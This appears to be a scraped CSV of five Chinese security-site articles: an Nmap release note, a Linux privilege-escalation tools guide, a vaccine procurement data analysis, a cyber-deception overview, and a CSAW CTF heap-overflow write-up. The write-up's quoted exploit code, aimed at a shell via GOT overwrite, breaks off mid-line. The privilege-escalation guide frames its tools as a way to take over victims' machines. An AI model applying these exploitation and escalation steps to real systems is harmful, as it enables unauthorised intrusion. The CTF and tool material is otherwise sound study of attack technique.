"5ccbfa124f2f0a0a7a69c00c","本次更新大幅度提升了Nmap在进行高频率、大规模扫描任务时的性能。","Kong","Nmap的基本功能Nmap的主要功能就是快速扫描大型网络。当然了，如果你要用它来扫描单个主机，它也绝对可以胜任。Nmap可以使用原始IP报文来扫描并发现网络中的主机，并且还可以将主机的操作系统版本、防火墙类型、报文过滤器类型、以及主机所能提供的服务信息全部发送给Nmap的使用者。虽然安全研究人员通常会使用Nmap来进行安全审计，但是Nmap所能做的远远不止这些。Nmap主要有以下三大基本功能：1.     探测目标主机是否在线；2.     扫描主机端口，嗅探目标主机所能提供的网络服务；3.     判断目标主机使用的操作系统；值得注意的是，Nmap不仅可以用来扫描仅有两个节点的LAN网络，而且还可以扫描五百个节点以上的网络。Nmap允许用户自定义扫描任务，用户可以根据自己的需要来自定义扫描操作。Nmap的输出数据是一个目标主机列表，列表中包含有扫描主机的各种信息。Nmap的使用者可以根据这些信息来进行下一步的渗透测试工作。除此之外，Nmap还支持使用脚本来进行渗透测试。在Nmap安装目录下的“share/nmap/scripts”文件夹中，Nmap的开发人员已经为广大用户编写好了一些基本的脚本，用户可以使用这些脚本来完成一些基本的渗透测试任务。实际上，Nmap这款工具在很多人眼里只是一个网络端口扫描工具。其实除了这个基础功能之外，Nmap还具备相对完整的信息收集、数据库渗透、以及网络渗透测试等功能。在强大的NSE脚本支持下，Nmap几乎可以完成我们所要完成的任何网络扫描测试任务。Nmap 7.4.0BETA1版更新细节（发布于2016年12月）1.［NSE］将NSE的Lua语言更新到了5.3版本，添加了新的操作运算符、整形数据类型、UTF8编码库、以及本地二进制代码包的打包和拆包功能。移除了部分无用的代码库，增加了bits.lua，替换了base32、base64、以及bin库。2.［NSE］添加了大量新的NSE脚本。3.［NSE］修复了解析TLS证书时产生的程序崩溃错误。4.［NSE］添加了“–script-timeout”选项，用来限制单个NSE脚本的运行时间。5.［NSE］提升了NSE脚本的运行速度。6.［NSE］修复了当套接字通信发生错误（例如目标网络不可到达）时，程序出现内存崩溃的错误。7.［NSE］添加了一个用于计算日期和时间的datetime库，clock-skew脚本需要使用这个库。8.［Npcap］将Npcap从0.07-r17版本升级到了0.09，并大幅提升了Npcap的性能。9.［Nsock］［GH#148］添加了新的IOCP Nsock引擎，它可以使用Windows操作系统下的重叠I/O API接口来提升Nmap的扫描性能和NSE脚本的运行速度。10.［GH#376］使用我们的“Insecure.Com LLC”sha256证书对Windows代码库进行了代码签名。11.［Npcap］改进版本的npcap Windows数据包捕获。12.［Zenmap］［GH#449］修复了关闭Zenmap时，由只读zenmap.conf文件引起的崩溃错误。13.［Ncat］［GH#444］在Ncat中添加了一个“-z”选项。该选项与netcat中的“-z”选项功能类似，它可以用来对目标主机的端口进行快速检测。14［GH#140］将可支持的目标DNS主机名长度增加到了256个字节。15.［Ncat］修复了“–exec”命令在配合“–ssl”和“–max-conns”命令使用时所引起的崩溃问题。16.［GH#439］Nmap现已支持OpenSSL 1.1.0-pre5。17.修复了Windows端Nmap在检测Npcap/WinPcap是否存在时所引起的错误。18.大幅度提升了Nmap在进行高频率、大规模扫描任务时的性能。注：由于篇幅有限，感兴趣的读者请移步Nmap官方网站了解详细的更新细节。［传送门］下载地址：［点我下载］","2016-12-30 13:29:41","安全工具","安全扫描神器Nmap 7.40新版发布，提升大规模扫描效率","http://nsoad.com/Security-tools/20161230/tools-959.html"
"5ccbfa124f2f0a0a7a69c00d","当你攻击一台计算机时可能会遇到一些拒绝执行操作的限制，就算你有一个shell也可能会遇到此问题。","kong","简介当你攻击一台计算机时可能会遇到一些拒绝执行操作的限制，就算你有一个shell也可能会遇到此问题。为了获得目标主机的完全控制权限，你需要在未被用户授权的地方绕过权限控制。你可以使用这些权限删除文件，浏览保密信息，或者安装病毒等用户讨厌的软件。Metasploit中拥有各种奇淫巧计，让你能远程系统下尝试获取受害者电脑的系统级权限。除此之外，当你在目标机器上尝试提升权限时还有一些Linux脚本可供使用，通常它们针对的是枚举系统信息而不是给出特定的漏洞或者利用。使用这些类型的脚本将会为你节省很多时间。         在Linux中使用payload，之后为反向连接开启multi/handler。一旦你成功侵入了受害者计算机，就可以使用以下脚本进行提权了。LinEnum脚本化的linux本地枚举和权限提升检测隐私访问：判断当前用户是否能不使用密码执行sudo访问；能否访问root用户的home目录。系统信息：主机名，网络信息，当前IP等。用户信息：当前用户，列出所有用户的uid/gid信息，列出root用户，检查密码hash是否保存在/etc/passwd。内核和发行版详细信息Git clone https://github.com/rebootuser/LinEnum.git完成下载之后，你就可以在终端中通过键入./LinEnum.sh来运行它。之后它将转储所有获取的数据和系统详细信息。Linuxprivchecker枚举系统配置以及执行一些提升权限的检查。通过下面这道传送门下载：传送门只需在终端键入python linuxprivchecke.py就可以使用该脚本，该脚本将枚举文件和目录的权限和内容。这个脚本和LinEnum工作原理大致相同并且在相关系统网络和用户获得的信息更详细。Linux Exploit Suggester它基于操作系统的内核版本号。这个程序会执行“uname -r”命令来获取Linux操作系统发行版本，之后返回一个包含了适用exploits的提示列表。此外它还提供了一个“-k”参数用以指定内核版本。与上面介绍的不同，它是一个Perl脚本。可使用以下命令下载这个脚本。git clone https://github.com/PenturaLabs/Linux_Exploit_Suggester.git如果你知道内核版本号就可以在终端中直接键入下列命令：        ./Linux_Exploit_Suggester.pl -k 3.5如果不知道就键入      ./Linux_Exploit_Suggester.pl uname –r来获得内核版本号，然后使用上一条命令并把版本号替换成你自己的。然后它就会给出以下建议列表。Unix-Privesc-checker在UNIX系统上检测提权向量的shell脚本，它可以在UNIX和Linux系统上运行。寻找配置错误用以为非授权用户提升权限或者访问本地应用。       它被编写为单个shell脚本所以可以很容易上传和执行。它可以被普通用户或者root用户执行。当它发现一个组可写的文件或目录时，如果这个组包有超过一个的非root用户，它只标记一个结果。使用下列命令下载Git clone https://github.com/pentestmonkey/unix-privesc-check.git解压文件，键入以下命令执行unix-privesc-check standard     当然你也可以使用以下命令实现同样目的。unix-privesc-check detailed","2016-12-08 20:55:04","安全工具","Linux提权？这四个脚本可以帮助你","http://nsoad.com/Security-tools/20161208/tools-900.html"
"5ccbfa124f2f0a0a7a69c00e","第一类疫苗，是指政府免费向公民提供，公民应当依照政府的规定受种的疫苗，包括国家免疫规划确定的疫苗...","wstart","前言什么是第二类疫苗第一类疫苗，是指政府免费向公民提供，公民应当依照政府的规定受种的疫苗，包括国家免疫规划确定的疫苗，省、自治区、直辖市人民政府在执行国家免疫规划时增加的疫苗，以及县级以上人民政府或者其卫生主管部门组织的应急接种或者群体性预防接种所使用的疫苗；第二类疫苗，是指由公民自费并且自愿受种的其他疫苗。常见的二类疫苗有：口服轮状病毒疫苗、甲肝疫苗、HIB 疫苗、流感疫苗、狂犬病疫苗等。这次事件的起因是？ 长春长生又是什么角色长春长生是一家药企，但是在最近的事件中，被发现所造疫苗连续造假7 月 15 日 药监局发现长春生产的狂犬疫苗出了问题。没收了 GMP 证书7 月 20 日 长春生产的吸附无细胞百白破联合疫苗因 [效价测定] 项不符合规定，收到了《吉林省食品药品监督管理局行政处罚决定书》，没收库存的“吸附无细胞百白破联合疫苗” 186 支。但是这个家药企的历史背景更是劣迹斑斑，详情请自行查阅的&lt;疫苗之王&gt;本次涉事的不止长春长生，还有长生生物、武汉生物、江苏延申、深圳康泰、民海生物等也一并列入分析情况，涉事的是二类疫苗(不太清楚一类疫苗的情况，能力有限，先从二类疫苗开始)本文的主要目的是通过已经公示的情况来查看一下长春二类疫苗在各省份的情况方便各位进行参考和自检数据采集源因为有一些实在太难找了，只能两年来看一下情况，并且不考虑增补名单所以我本人自己的整理并不完整，所以，所有数据和代码已经全部同步到 GitHub：有需要可以自取或者完善告诉我，采集关键词省名 第二类疫苗 采购省名 第二类疫苗 公示省名 第二类疫苗 产品及价格省名 第二类疫苗 供应商省名 第二类疫苗 中标目录省名 第二类疫苗 参考价省名 第二类疫苗 入围结果采集结果整理如下北京市，来源:北京市 2018-2019 年免疫规划用第二类疫苗采购项目天津市，来源:天津市 2018-2020 年第二类疫苗集中采购项目拟中标 /拟中选结果上海市，来源:2018 年度上海市第二类疫苗集团采购项目中标目录重庆市，来源:重庆市第二类疫苗供应商入围采购-采购结果预公示河北省，来源:河北省疾病预防控制中心 2018 年度第二类疫苗省级集中采购项目中标公告山西省，来源:2018 年度山西省第二类疫苗集中采购入围企业产品及价格辽宁省，来源:辽宁省第二类疫苗平台招标采购公告吉林省，来源:2017 年度吉林省第二类疫苗集中采购企业产品议价结果名单黑龙江省，来源:黑龙江省 2018 年第二类疫苗挂网采购中标企业产品及价格审核结果江苏省，来源:江苏省第二类疫苗集中采购中标产品(这个还花了我 19.9 在百度文库买的，艹)浙江省，来源:浙江省 2018 年第二类疫苗中标目录安徽省，来源:安徽省 2018 年第二类疫苗集中采购目录福建省，来源:福建省 2018 年第二类疫苗集中采购目录_湄洲岛江西省，来源:1228 江西省 2018 年度第二类疫苗入围品种目录山东省，「找不到」河南省，来源:2017 年河南省二类疫苗供应商入围资格采购项目中标结果公告湖北省，来源:2017 年湖北省第二类疫苗集中采购成交产品湖南省，来源:湖南省第二类疫苗集中采购文件广东省，来源:2018 年度广东省第二类疫苗成交品种目录海南省，来源:海南省第二类疫苗品种目录（第一批）四川省，来源:2017 年度第二类疫苗挂网阳光采购结果贵州省，来源:贵州省第二类疫苗集中采购报价解密结果云南省，来源:云南省疾病预防控制中心二类疫苗公开招标入围项目入围公告陕西省，来源:陕西省 2018 年二类疫苗集中采购项目入围供应商磋商结果甘肃省，来源:甘肃省第二类疫苗供应资格采购项目中标公示青海省，来源:所有的第二类的价格信息全部转到:223.220.250.135:8038 无法查看台湾省，暂无内蒙古自治区，2018 年内蒙古自治区第二类疫苗集中采购入围企业产品及价格广西壮族自治区，2017 年度广西壮族自治区第二类疫苗直接挂网采购拟入围产品目录（电子版）西藏自治区，实在找不到宁夏回族自治区，2016 年宁夏回族自治区第二类疫苗公开招标预中标结果新疆维吾尔自治区，《自治区 2017 年第二类疫苗入围品种及价格目录》 20170828.xls香港特别行政区，暂无澳门特别行政区，暂无综上， 除去港澳台 ， 山东，青海以及西藏以外，只拿到了 30 个省级行政区的二类疫苗数据公示情况单单是去检索，下载的过程，就足足花了 7 个多小时。作为政府需要公示的数据，没想到获取的过程这么困难和艰辛	某些政府网站先登录才可以下载	有些政府网站被菠菜了	搜索框有，但是没得按	有些只有图片	有些只在公告出现过	找不到信息的有山东省，只看到新闻说建了可追溯的展示平台，不知道怎么追。。青海省，所有的第二类的价格信息全部转到:223.220.250.135:8038 无法查看西藏，神秘的力量导致无法搜索如图,最终获取到 27 个省份的数据数据整理由于不是专业的医药人士，所以统一把数据整理成以下的 csv 格式通用名,来源,生产企业,申报企业,省,中标年份 name,src,create_company,report_company,prov,year各项含义如下：	通用名 ：药名 -&gt; name	来源：国产 /进口 -&gt; src	生产企业 -&gt; create_company	申报企业：如果为空再填充为生产企业 -&gt; report_company	省 -&gt; prov	中标年份 -&gt; year又因为整理非 XLS 的文件消耗大量的时间暂时也得先延后，先把成型的数据集提取目前处理结果如下数据标准 csv(14)吉林省,四川省,天津市,宁夏回族自治区,安徽省,山西省,广东省,新疆维吾尔自治区,江苏省,江西省,海南省,贵州省,辽宁省,黑龙江省,等待整理的数据(13)上海市,云南省,内蒙古,北京市,广西省,河南省,浙江省,湖北省,湖南省,甘肃省,福建省,重庆市,陕西省,如图所示 ，	亮绿色是容易获取的数据	暗绿色的可以获取的数据	黑色则是没有数据数据分析直接采用 pandas+echart 进行处理首先把所有的 csv 整合，共有 1529 条数据对所有的生成企业进行统计分析count    167.000000mean       9.143713std       15.839281min        1.00000025%        1.00000050%        3.00000075%        9.000000max       98.000000共 167 个厂家，其中中位数是 3，最高是 98，很明显这是一个偏态分布。 顺手看一下箱线图也就是说，绝大多的数的药，都被大厂垄断。我们输出前 10 个看看生产厂家 | 数量 ---|--- 北京科兴生物制品有限公司|98   长春长生生物科技有限责任公司| 91  华兰生物疫苗有限公司|72   玉溪沃森生物技术有限公司|57 上海生物制品研究所有限责任公司|56  大连雅立峰生物制药有限公司|51    长春生物制品研究所有限责任公司|50  华北制药金坦生物技术股份有限公司|46 辽宁成大生物股份有限公司|44 北京智飞绿竹生物制药有限公司|43长春长生位列第二。我们再来看看各个省份中，长春长生等占据的百分比[{'name': '天津', 'value': 14.0625}, {'name': '辽宁', 'value': 17.647058823529413}, {'name': '黑龙江', 'value': 13.274336283185843}, {'name': '安徽', 'value': 9.75609756097561}, {'name': '新疆', 'value': 16.94915254237288}, {'name': '江苏', 'value': 14.563106796116504}, {'name': '江西', 'value': 12.179487179487179}, {'name': '山西', 'value': 16.52173913043478}, {'name': '吉林', 'value': 17.857142857142858}, {'name': '贵州', 'value': 14.17910447761194}, {'name': '广东', 'value': 13.445378151260504}, {'name': '四川', 'value': 16.93548387096774}, {'name': '宁夏', 'value': 17.5}, {'name': '海南', 'value': 14.285714285714285}] 长春长生等在 14 个有数据的省份供应商中均占有一席之地	亮红色 接近 20%	暗红色 接近 10%	黑色是没数据结合它的销售策略来看,（这个图是从它官网下载所得）销售的情况比它想象的要好呢，在这 14 个省份里面，每 10 种疫苗，就有一种来自长春长生们的手中。后续做到这里已经到了夜晚的 11 点从早上 9 点坐到现在，花了整整 14 小时，却才整理了一半的省份北京，上海，浙江等大省缺连数据都找不全，需要人工去校对，许多省份还偷偷把公示的数据强行加上了 登陆认证的权限，对于一个以网络为生的我十分吃力，获取这些信息十分吃力对于普通人而言，那就更加无从下手了，直到现在药监局迟迟没回应，可能他们也发现了，寻找这些疫苗药物，真的比较困难吧。所有数据我会同步到 github https://github.com/fuckcqcs有兴趣的同学可以下载回来研究，后续我会完善其他省份本文作者：wstart  来源地址：https://www.v2ex.com/t/473163","2018-07-23 13:37:30","数据安全","我花了 14 个小时找了一下长春长生们究竟卖到了哪里去","http://nsoad.com/Article/dbsec/20180723/1213.html"
"5ccbfa124f2f0a0a7a69c00f","面对网络攻击如何“忽悠”回去？如何将来犯的黑恶玩弄于股掌之间？网络欺骗也许能给你一些思路。","谢幺","当你发现自己正在遭遇黑客攻击，你是否想到佯装被骗，将计就计来迷惑甚至反击黑客？这听起来有些玄乎，但类似的事情居然在一千年之前就曾发生过。赤壁之战前夕，周瑜佯装醉酒，故意让曹操派来的间谍蒋干盗走一封降书，让曹操错杀了曹瑁、张允两位将领，不费一兵一卒就除掉了自己的眼中钉。这个“蒋干盗书”的历史典故如果发生在当今网络攻防的环境下，情节可能是这样：曹氏集团派出黑客蒋干成功渗透到竞争对手东吴集团内部，成功拿到东吴集团高管的邮箱权限。根据邮件透露，曹氏集团的核心技术骨干蔡瑁、张允曾多次和东吴集团通信，出卖核心技术资料。情报传回曹氏集团后，蔡、张二人很快被当做“内鬼”处理，被冤枉的二人心生怨恨，于是跳槽到东吴集团。而事实情况却是，那封邮件是东吴集团的网络高手周瑜伪造，故意放出来给攻击者的 “蜜饵”。周瑜发现黑客入侵后，没有选择一味的防御，而是主动出击设置陷阱将计就计，最终用很小的代价就挖到了对手的两位核心技术骨干。【历史典故的攻防分析（By arkteam)】以上内容虽是雷锋网基于历史典故的虚构，但事实上，在如今的商业甚至国家网络安全层面的网络攻防中，诸如此类的“防御者诡计”，早已经被用得淋漓尽致，甚至已经发展成了一项专门的技术。攻防中的网络欺骗最初，这些借刀杀人，以逸待劳的计谋，更多被用于进攻，比如：水坑攻击，黑客先攻破企业内网的一个普通站点，然后将受害者必须下载的文档替换成了木马，从而让对方自投罗网，以逸待劳。鱼叉式钓鱼，先搞定你的客户的电脑，然后用他的账号给你发带木马的邮件，借刀杀人。除此之外，攻击者还会利用各种各样的人性弱点，进行社会工程学攻击。因为攻击者总是处于主动、有利的位置，传统的被动式防御措施在如此攻势下难免捉襟见肘，可一旦防御者能采取网络欺骗的策略，反向欺骗回去，情况则大不相同。在 FIT 2017 互联网安全创新大会上，Arkteam 安全团队的刘潮歌进行了一场名为“防御者的诡计”的主题演讲，讲述了在现如今网络攻防当中，网络防御者如何通过将计就计的手段来迷惑、拖延甚至反击对手。在刘潮歌看来，与其把网络欺骗作为一门技术，更不如称之为一种应对策略。在APT 攻击（高级持续性威胁）日益增多的环境下，一味的防守最终会束手无策，而网络欺骗则打开了新的思路。他认为，网络欺骗相较于传统的被动式防御，是一种更为积极主动的防御方式，它的优势主要体现在三个方面：1. 可以发现网络攻击：对于一个网络攻击，及时的发现它是非常重要的，而网络欺骗可以帮助防御者发现正在进行的攻击，甚至是潜在的攻击。2.可以“黏住”网络攻击：通过迷惑攻击者，达到消耗对方时间精力，从而为后续的防御工作留下时间，或者迫使对方放弃此次攻击。3. 可以溯源和反制：通过欺骗来让对方暴露自己的攻击意图和攻击手段，最终可以溯源取证和采取反制措施。网络欺骗的关键技术有哪些？提及网络欺骗的具体技术手段，刘潮歌说，网络欺骗的关键技术通常有四部分：蜜罐、蜜饵/蜜标/面包屑、虚拟资产和影子服务。1.蜜罐蜜罐技术如今已经成为一项很常见的网络防御措施，顾名思义，蜜罐就是网络防御者精心布置的“黑匣子”，专门用来引诱黑客攻击的服务器。看似漏洞百出，实则尽在掌握，它的作用就是让黑客入侵，借此收集证据，同时隐藏真实的服务器地址。一台合格的蜜罐不仅拥有发现攻击、产生警告、数据记录、欺骗、协助调查的功能，在必要时还可以根据蜜罐收集的证据来起诉入侵者。【蜜罐应用示意图】2.蜜饵/蜜标/面包屑这些方式和蜜罐技术类似，只是具体实施手法不同。蜜饵通常是布置一些攻击者可能感兴趣的资源作为诱饵，比如某某作战计划、某某商业合同等等，平常状态下，这些文件不会被打开，因此一旦发现这些这些文件被他人碰触或打开，则基本可以断定有人入侵，有必要仔细检查一下内网的安全了。【蜜饵应用示意图】蜜标同样如此，很多人不知道的是，我们常用的 Word 文档、PDF 文档中其实可以植入一个URL地址，当攻击者打开这个文件时，链接可以被自动打开，而且是以 HTTP 的形式打开，因此当攻击者打开蜜标文件时，防御者就可以借机获取他的IP地址、浏览器指纹等攻击者的信息，从而溯源攻击者。【蜜标应用示意图】和蜜饵/蜜标相比，面包屑更为主动，防御者通过故意释放出更多更零散的虚假信息，比如虚假的 Cookie 信息、虚假的浏览器记录密码、SSH 秘钥、VPN 秘钥等等，许多攻击者拿到这些信息时，往往会以为自己捡到了宝贝，殊不知自己得到的是一剂“毒药”，这些面包屑会将攻击者引诱至提前布置好的蜜罐或影子服务当中，从而瓮中捉鳖。无论是蜜罐、蜜饵还是面包屑，都是基于“诱饵”的思想，这些诱饵既可以是一些虚假的代码注释，可以是故意用来给攻击者的虚假网站后台，可以是一条数据库记录，当有人用SQL注入来获取这条记录的时候，就相当于给你报警了。刘潮歌强调，如果企业希望通过网络欺骗来进行防御，那么不妨提前根据自身的网络环境来了解，哪些东西可以真正作为诱饵。3.影子服务影子服务是由 ArkTeam 自己提出来的防御方式，较传统的蜜罐来说更具有迷惑性和实用性，但也更加复杂。所谓影子服务，就是一个和真实服务看起来一模一样的网络服务，不同的是，真实服务提供给用户，而影子服务提供给攻击者。当有一些可疑流量过来时，可以先把它带到影子服务器上进行监控分析，如果发现是攻击者，则进行下一步监控、警报和记录攻击行为。【影子服务应用示意图】4.虚拟资产除了诱饵，防御者还想到了为自己的重要资产找一些“替身”，这就是虚拟资产。在传统的防御状态下，一个企业的内部网络对于黑客来说并不会太复杂，只要突破内外网的围墙式防御就可以为所欲为，很快就能接触到企业的重要资产，因此有人也将围墙式的防御比作是椰子，外表很坚固，里面很美味。但如果防御者部署了大量虚拟资产，则可以让攻击者无法触碰到真实资产，让他好似进入迷宫找不到出口，一步步耗费时间精力，赢得更多反击时间，甚至逼迫对方主动放弃攻击。从某种层面来说，影子服务也起到了类似的作用——“黏”住黑客。【图片来源：长亭科技】网络欺骗对防御者越来越重要雷锋网(公众号：雷锋网)注意到，刘潮歌在演讲中多次强调一件事——网络欺骗将逐渐在网络攻防中扮演越来越重要的位置。他说，2014 年美国空军发布了一个研究报告（BAA-RIK-14-07), 指出要研究网络欺骗技术，并在次年签订了两份总值9800万美元的合同，其中一份就是关于网络欺骗技术的。美国军方公开采购了这一合同，这在学术界或商业界都实属罕见。【美军发布网络欺骗相关报告】在商业应用方面，专业研究机构 Gartner 也在2015年7月发布的报告中也指出，基于欺骗的安全防御技术将会有很大的市场前景，并预测到2018年，将会有10%的单位使用欺骗工具或策略来对抗网络攻击。甚至在学术界，网络欺骗也逐渐得到重视，2016 年7月，Springer 出版了一本名为《Cyber Deception: Building the Scientific Foundation 》的书籍，书中集合了世界各地顶级网络欺骗研究人员的最新研究，目的就是为网络欺骗建立学科基础。雷锋网编辑认为，世间万事万物，道理总是相通，有人说商场如战场，有人说官场如战场，也许在刘潮歌的眼中，网络世界也是一片充满谋略、尔虞我诈的战场，而网络欺骗技术和古代战争中的计谋也并不区别，策略还是那些策略，兵法还是兵法，只是实施的地点从一个战场转移到另一个战场罢了。","2017-01-04 16:16:46","网络安全","网络欺骗，教你如何把黑客玩弄于股掌之间","http://nsoad.com/Article/Network-security/20170104/978.html"
"5ccbfa124f2f0a0a7a69c010","这是CSAW CTF 2016的一道pwn300的题。这道题的利用思路不错,分享下。题目源码以及分析的ida数据文件下载链接链接:https://pan.baidu.com/s/1hsFi93A 密码: jda9本地运行题目","blackhold","这是CSAW CTF 2016的一道pwn300的题。这道题的利用思路不错,分享下。题目源码以及分析的ida数据文件下载链接链接:https://pan.baidu.com/s/1hsFi93A 密码: jda9本地运行题目socat TCP4-LISTEN:10001,fork EXEC:./hungman运行这条命令可以让 程序的标准输入输出都重定向到 10001端口,所以我们可以nc连过去分析拿到一道题首先看看开启了哪些安全措施通过运行这个程序我们可以很容易发现这是一个hangman游戏的实现。经过初步运行程序大致了解程序的运行流程后就可以使用ida进行逆向分析了。我在逆向分析时遇到了一个大坑.由于太信任ida的f5插件,导致浪费了很多时间.对位于0x400F2D的函数 f5看看这里我对一些变量改了下名,有没有觉得这里有些比较奇怪的语句.比如:*((_QWORD *)name + 1) = input;*((_DWORD *)name + 1) = len;memcpy(*((void **)name + 1), &amp;s, len);乍一看还以为这里有溢出呢, 实际上这里是ida的f5 插件出了些问题.导致反编译的时候出现一些奇怪的语句.所以这里只能去看汇编代码了.搞pwn关键是内存的布局,使用的情况.所以我们在看汇编代码重点要关注的是内存的分配与使用情况, 这个程序所用的结构体的各个数据区的分配,使用大体在下面.做了些注释GetName 函数.text:0000000000400FC3                 mov     eax, [rbp+input_len].text:0000000000400FC9                 cdqe.text:0000000000400FCB                 mov     rdi, rax        ; size.text:0000000000400FCE                 call    _malloc   ;分配空间存放刚刚输入的用户名.text:0000000000400FD3                 mov     [rbp+input], rax.text:0000000000400FDA                 mov     edi, 80h        ; size.text:0000000000400FDF                 call    _malloc   ;分配空间作为一个obj对象,存放玩家的信息.text:0000000000400FE4                 mov     [rbp+obj], rax.text:0000000000400FEB                 mov     rax, [rbp+obj].text:0000000000400FF2                 mov     edx, 80h        ; n.text:0000000000400FF7                 mov     esi, 0          ; c.text:0000000000400FFC                 mov     rdi, rax        ; s.text:0000000000400FFF                 call    _memset.text:0000000000401004                 mov     rax, [rbp+obj].text:000000000040100B                 mov     rdx, [rbp+input].text:0000000000401012                 mov     [rax+8], rdx    ;将刚刚分配的一个缓冲器的指针存放到obj偏移8处.text:0000000000401016                 mov     rax, [rbp+obj].text:000000000040101D                 mov     edx, [rbp+input_len].text:0000000000401023                 mov     [rax+4], edx     ;把用户名的长度存放到 obj偏移4处.text:0000000000401026                 mov     eax, [rbp+input_len].text:000000000040102C                 movsxd  rdx, eax        ; n.text:000000000040102F                 mov     rax, [rbp+obj].text:0000000000401036                 mov     rax, [rax+8].text:000000000040103A                 lea     rcx, [rbp+s].text:0000000000401041                 mov     rsi, rcx        ; src.text:0000000000401044                 mov     rdi, rax        ; dest.text:0000000000401047                 call    _memcpy         ;用户名拷贝到obj偏移8处的指针所指的位置..text:000000000040104C                 mov     rax, [rbp+obj].text:0000000000401053                 mov     rbx, [rbp+var_18].text:0000000000401057                 xor     rbx, fs:28h.text:0000000000401060                 jz      short loc_401067.text:0000000000401062                 call    ___stack_chk_failplay_hangman_400B3A函数比较长,就不具体分析了.最后得到obj结构体的结构为obj + 0:  所得分数obj + 4: 名称obj + 8: 存放用户名的指针obj + 16: 用于存放被猜测的字符.程序所使用的数据结构分析完了,下一步就是分析程序的逻辑.(逆向的两个主要工作就是分析清楚程序所使用的数据结构及程序的逻辑)程序在获取用户名之后就会进入到玩游戏的主循环..text:0000000000400ABA LOOP_400ABA:                            ; CODE XREF: main_400A0D+11Ej.text:0000000000400ABA     mov     rax, cs:player_obj_6020E0.text:0000000000400AC1     mov     edx, [rbp+ur_fd].text:0000000000400AC4     mov     esi, edx                    ; arg2: urandom fd.text:0000000000400AC6     mov     rdi, rax                    ; arg1: player object.text:0000000000400AC9     call    play_hangman_400B3A......text:0000000000400B28     jz      short BREAK_400B2D.text:0000000000400B2A     nop.text:0000000000400B2B     jmp     short LOOP_400ABAplay_hangman_400B3A函数是游戏的主体部分.他的第一步工作就是使用一个随机数生成字符串.其长度和我们输入的用户名的长度一致,之后就是一些游戏具体实现逻辑.让我们直接调到漏洞点吧.漏洞点if ( *(_DWORD *)obj &gt; score )  //如果分数大于预设的分数,值为64时,进入{    puts(""High score! change name?"");    __isoc99_scanf("" %c"", &amp;v3);    if ( v3 == 121 )    {        s = malloc(0xF8uLL);        memset(s, 0, 0xF8uLL);        v8 = read(0, s, 0xF8uLL);        *(_DWORD *)(obj + 4) = v8;        v14 = strchr((const char *)s, 10);  //找换行符的位置        if ( v14 )        *v14 = 0;        memcpy(*(void **)(obj + 8), s, v8); //将读取的字符串复制到原来用户名所在的内存区域        free(s);    }    snprintf(buf_512, 0x200uLL, ""Highest player: %s"", *(_QWORD *)(obj + 8));    score = *(_DWORD *)obj;}如果你还记得的话,我们在刚开始构建obj结构体时,为用户名分配的内存大小是0x80的,然而这里程序没有考虑到这一点,而是直接读取最大字节数为0xf8的字符,然后复制到先前分配的那块内存中去.假设在开始设置用户名时我们输入10个字符,接着使我们游戏分数大于64, 接着我们就可以修改用户名,这时,将用户名设置为0xf8大小之后复制到原来存储用户名的内存区时就会触发一个堆溢出.通过分析程序开始到这里的内存使用情况,此时堆内存布局是这样的我们就可以通过溢出name,进而覆盖obj对象的name指针,来实现一个漏洞利用.漏洞利用a. 首先我们需要使我们的分数达到64分以上,我们可以通过发生从 a 到 z的所有字符直到我们能够猜到大妈的所以字符.那么我们就能取得一个很高的分数.b. 一旦我们重写了位于 obj 结构体中的 name 指针我们将很容易就可以实现任意地址读写,下面来分析下怎么实现任意地址读写.memcpy(*(void **)(obj + 8), s, v8);free(s);}snprintf(buf_512, 0x200uLL, ""Highest player: %s"", *(_QWORD *)(obj + 8));score = *(_DWORD *)obj;当溢出发生后,紧接着就会把  obj + 8 处的存放的指针的数据打印出来,通过溢出我们是可以控制这个指针的值的. 那么任意地址读实现,我们可以用它来读取 got 表中的一些函数,进而实现对aslr的绕过.接下来我们在玩一次,并且比分也能在 64 以上,我们就能往刚刚设置的 地址处写入内容.进而任意地址写实现.c. 我们现在有了一个任意地址读写的漏洞,该怎么去利用他呢.从一开始我们就检查了 程序开启的防护措施,他开了 nx 也就是数据执行保护,RELPO 的属性是 Partial ,  那么我们就可以通过覆写 got 表来实现漏洞利用.要使用 got 表覆写的话,自然而然的想到应该覆写 free 函数在 got表的地址为 system函数的地址,因为在调用 memcpy 函数之后,紧接着就调用了 free函数..text:0000000000400EC4     call    _memcpy                     ; overflow!.text:0000000000400EC9     mov     rax, [rbp+s].text:0000000000400ECD     mov     rdi, rax                    ; ptr.text:0000000000400ED0     call    _free听起来还是不错的,但是这里还有一个坑,就是我们在覆写 got 表的时候,此时的 [rbp+s] 所指向的内存的字符串的不是以 /bin/sh\x00 开始的,而是要覆盖 free 函数指针的值.因此如果直接将 got表中 free函数的值覆盖为 system函数的地址,并不能执行 system(""/bin/sh"") 也就不能 pwn成功.所以要想实现 getshell , 我们需要做的是找到一个函数的调用点,他的第一个参数指向的内存区域的内容我们可控,这样我们就能通过函数 覆写 got 表来使得调用他时实际调用的函数为 system,然后执行 system(""/bin/sh"") 搞定它.经过查找找到了一个.text:0000000000400A33                 mov     edx, 200h       ; n.text:0000000000400A38                 mov     esi, 0          ; c.text:0000000000400A3D                 mov     edi, offset buf_512 ; s.text:0000000000400A42                 call    _memset.bss:0000000000602100 ; char buf_512[512].bss:0000000000602100 buf_512         db 200h dup(?)          ; DATA XREF: main+30o.bss:0000000000602100                                         ; main+44o ....bss:0000000000602300 score           dd ?                    ; DATA XREF: main+4Ew.bss:0000000000602300在main 函数中调用  memset 函数时它的第一个参数为指向 .bss 段的一个未初始化的内存,又由于之前我们已经能对got实现写入 最大 0xf8字节的数据.所以我们可以从 got表的 free 函数开始写 ,一直写到.bss:0000000000602100 ; char buf_512[512]  并且把got 表中memset函数的地址设为system函数的地址.实现漏洞的利用.由于覆盖整个 got 表,其他函数的地址也会被修改,所以我还需要针对got的修改实现一条 调用链,确保能正常的执行到main函数中的memset,然后就能getshell 啦.具体的利用过程,结合大牛写的exp来分析.就拿一些关键的点出来分析,其他的请自行结合exp分析.第一步溢出 name ,修改 obj 偏移8处的地址.# -------------------------------------------------------------------------    # first overflow: Arbitrary read    # -------------------------------------------------------------------------    ovfl  = ""A"" * 128                               # fill name    ovfl += struct.pack(""&lt;Q"", 0x1122334455667788)   # prevsize (heap meta)    ovfl += struct.pack(""&lt;Q"", 0x1122334455667788)   # size (heap meta)    ovfl += struct.pack(""&lt;L"", 0x200)                # score (must be &gt;64)     ovfl += struct.pack(""&lt;L"", 0x128)                # name length    ovfl += struct.pack(""&lt;Q"", 0x0000000000602018)   #把name 指针的值修改为got表中free函数的地址    s.send( ovfl + 